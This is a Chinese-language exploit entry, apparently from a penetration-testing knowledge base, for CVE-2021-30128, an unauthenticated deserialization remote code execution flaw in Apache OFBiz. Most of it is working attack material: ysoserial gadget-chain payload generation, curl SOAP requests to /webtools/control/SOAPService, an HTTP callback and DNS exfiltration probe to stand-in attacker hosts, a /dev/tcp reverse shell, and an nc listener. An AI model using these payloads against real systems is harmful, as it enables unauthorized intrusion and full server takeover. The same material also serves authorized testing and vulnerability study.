Vuln/middleware/ofbiz/CVE-2021-30128.md

---
id: CVE-2021-30128
title: Apache OFBiz 反序列化远程代码执行漏洞
product: ofbiz
vendor: Apache
version_affected: "< 17.12.07"
severity: CRITICAL
tags: [rce, deserialization, 无需认证]
fingerprint: ["Apache OFBiz", "OFBiz"]
---

## 漏洞描述

Apache OFBiz 17.12.07 之前版本存在另一种 CVE-2021-26295 修复绕过方式。攻击者可利用不同的反序列化 gadget 链，通过 SOAP 端点 `/webtools/control/SOAPService` 的 `cus-obj` 标签发送恶意序列化对象，绕过已有的反序列化防护实现远程代码执行。该漏洞与 CVE-2021-29200 为同一端点的不同绕过变体。

## 影响版本

- Apache OFBiz < 17.12.07

## 前置条件

- 无需认证
- 能够访问 OFBiz 的 HTTPS 端口（默认 8443）
- `/webtools/control/SOAPService` 端点可达

## 利用步骤

1. 确认目标为 Apache OFBiz 且版本 < 17.12.07
2. 使用 ysoserial 生成不同 gadget 链的序列化 payload（如 CommonsBeanutils、CC 链等）
3. 将 payload 转为 hex 编码，嵌入 SOAP 请求的 `cus-obj` 标签
4. 发送至 `/webtools/control/SOAPService`
5. 通过 DNS/HTTP 回调或反弹 shell 确认利用成功

## Payload

```bash
# 使用专用 exploit 工具（推荐）
python3 ofbiz_exploit.py -u https://target:8443 -c "curl http://ATTACKER_IP/callback"
```

```bash
# 手动利用 — 使用 CommonsBeanutils1 gadget 链
# 步骤1: 生成 payload
java -jar ysoserial.jar CommonsBeanutils1 "curl http://ATTACKER_IP/callback" | xxd -p | tr -d '\n' > payload_hex.txt

# 步骤2: 发送 SOAP 请求
curl -X POST "https://target:8443/webtools/control/SOAPService" \
  -H "Content-Type: text/xml" \
  -d '<?xml version="1.0" encoding="UTF-8"?><soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/"><soapenv:Header/><soapenv:Body><ser:clearAllEntityCaches xmlns:ser="http://ofbiz.apache.org/service/"><ser:cus-obj>HEX_PAYLOAD_HERE</ser:cus-obj></ser:clearAllEntityCaches></soapenv:Body></soapenv:Envelope>' \
  -k
```

```bash
# DNS 外带验证 — 使用 URLDNS gadget（无 classpath 依赖）
java -jar ysoserial.jar URLDNS "http://ATTACKER.dnslog.cn" | xxd -p | tr -d '\n' > dns_payload_hex.txt

curl -X POST "https://target:8443/webtools/control/SOAPService" \
  -H "Content-Type: text/xml" \
  -d '<?xml version="1.0" encoding="UTF-8"?><soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/"><soapenv:Header/><soapenv:Body><ser:clearAllEntityCaches xmlns:ser="http://ofbiz.apache.org/service/"><ser:cus-obj>DNS_HEX_PAYLOAD_HERE</ser:cus-obj></ser:clearAllEntityCaches></soapenv:Body></soapenv:Envelope>' \
  -k
```

```bash
# 反弹 shell
# 先 base64 编码: bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1
java -jar ysoserial.jar CommonsBeanutils1 "bash -c {echo,BASE64_ENCODED_REVERSE_SHELL}|{base64,-d}|bash" | xxd -p | tr -d '\n' > shell_hex.txt

curl -X POST "https://target:8443/webtools/control/SOAPService" \
  -H "Content-Type: text/xml" \
  -d '<?xml version="1.0" encoding="UTF-8"?><soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/"><soapenv:Header/><soapenv:Body><ser:clearAllEntityCaches xmlns:ser="http://ofbiz.apache.org/service/"><ser:cus-obj>SHELL_HEX_PAYLOAD_HERE</ser:cus-obj></ser:clearAllEntityCaches></soapenv:Body></soapenv:Envelope>' \
  -k
```

## 验证方法

```bash
# 方法1: DNS 外带验证（推荐首选，无 gadget 依赖要求）
# 发送 URLDNS payload 后检查 dnslog 平台是否收到目标的 DNS 查询

# 方法2: HTTP 回调验证
python3 -m http.server 80
# 发送 curl 回调 payload 后检查监听端是否收到来自目标的 HTTP 请求

# 方法3: 反弹 shell
nc -lvp 4444
# 发送反弹 shell payload 后检查是否收到连接
```

## 指纹确认

```bash
# 检查 OFBiz 登录页面特征
curl -sk "https://target:8443/webtools/control/main" | grep -i "OFBiz"

# 检查 SOAP 端点是否可达
curl -sk -o /dev/null -w "%{http_code}" "https://target:8443/webtools/control/SOAPService"
```

## 参考链接

- https://nvd.nist.gov/vuln/detail/CVE-2021-30128
- https://ofbiz.apache.org/security.html
- https://lists.apache.org/thread/4ybmxhgs3vlhzp8q0lsp5g6z6hkpf0r9
